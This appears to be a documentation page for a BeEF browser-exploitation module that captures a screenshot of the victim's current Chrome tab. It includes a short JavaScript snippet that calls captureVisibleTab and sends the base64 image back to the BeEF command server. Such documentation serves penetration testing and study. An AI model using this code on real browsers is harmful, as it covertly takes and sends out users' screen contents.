## Summary

* **Objective**: Take a screenshot of the current tab
* **Authors**: mh
* **Browsers**: Chrome

* [Code](https://github.com/beefproject/beef/tree/master/modules/chrome_extensions/screenshot)

## Internal Working

This module tries to take a screenshot of the current tab and returns it to the as base64 data. Only works if the `chrome.tabs.captureVisibleTab` method is available.

As of 2019, it does not work in the newer versions of Chrome. This method only works within the context of an extension having the `<all_urls>` permission.

``` js
chrome.tabs.captureVisibleTab(null, function(img) {
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'img: ' + img.toString());
});
```

## References

https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/Tabs/captureVisibleTab


## Feedback

